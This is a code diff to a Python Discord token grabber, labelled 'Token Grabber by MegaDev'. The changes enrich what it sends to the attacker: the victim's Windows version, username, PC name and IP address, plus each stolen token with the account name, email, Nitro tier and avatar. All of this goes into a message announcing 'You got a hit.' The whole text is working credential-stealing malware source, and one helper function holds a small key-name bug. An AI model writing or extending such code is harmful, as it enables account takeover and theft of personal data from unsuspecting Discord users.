@@ -14,8 +14,8 @@ EXPERIMENTAL= False
 
 '''
 CHANGELOG:
-- added basic embed support
-- MODE = 'EMBED' works now
+- added embed support
+- added getPremiumType() function
 '''
 
 
@@ -67,7 +67,19 @@ def getPcInfo():
         windows_ver='Windows ' + platform.release() + ' ' + platform.win32_edition() + ' ' + platform.version(),
     )
     return userinfo
-    
+
+def getPremiumType(user_data):
+    try:
+        if user_data['premium_type'] == 0:
+            nitro = 'None'
+        elif user_data['premium_type'] == 1:
+            nitro = 'Nitro Classic'
+        elif user_data['premium'] == 2:
+            nitro = 'Nitro'
+    except:
+        nitro = 'None'
+
+    return nitro
 
 
 def main():
@@ -141,6 +153,16 @@ def main():
             pass
     elif MODE == 'EMBED':
         embeds = []
+        if SEND_PC_INFO:
+            PC_INFO = getPcInfo()
+            color = random.randint(0, 0xFFFFFF)
+            embed = {"title":'PC_INFO','description':f'``{PC_INFO["windows_ver"]}``',"color":color,"fields":[
+                           {
+                               "name":'**PC_IDENTITY**',
+                               "value":f"Username: ``{PC_INFO['user']}``\nPC NAME: ``{PC_INFO['pc_name']}``"
+                           }
+                       ]}
+            embeds.append(embed)
         for platform, path in paths.items():
             if not os.path.exists(path):
                 continue
@@ -150,25 +172,31 @@ def main():
             if len(tokens) > 0:
                 for token in tokens:
                     try:
+                        raw_user = getUserInfo(token)
+                        #print(raw_user)
+                    except:
+                        pass
+                        #print('This token does not work')
+                    try:
                        color = random.randint(0, 0xFFFFFF)
-                       raw_user = getUserInfo(token)
-                       if raw_user['premium_type'] > 0:
-                           nitro = True
-                       else:
-                           nitro = False
-                       user = f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}'
+                       nitro = getPremiumType(raw_user)
+                       user = f'{raw_user["username"]}#{raw_user["discriminator"]}'
                        embed = {"title":user,'description':f'Token:\n```{token}```',"color":color,"fields":[
                            {
                                "name":'**Discord Account Info**',
                                "value":f"NAME: ``{user}``\nEMAIL: ``{raw_user['email']}``\nNitro: ``{nitro}``\n"
                            }
-                       ]}
+                       ],'author':{
+                           'name':user,'icon_url':'https://cdn.discordapp.com/avatars/' + str(raw_user['id']) + '/' + str(raw_user['avatar'])
+                       }}
                        embeds.append(embed)
-                    except:
+                    except Exception as e:
                         pass
+                        #print(f'could not make an embed\n{e}')
 
-        ping = '@everyone' if PING_ME else ''
-        message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping,"embeds":embeds}
+        ping = '@everyone\n' if PING_ME else '\n'
+        ip = getIP() if SEND_IP else ''
+        message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping + 'IP: ``' + ip + '``',"embeds":embeds}
         payload = json.dumps(message)
 
         #print(message)
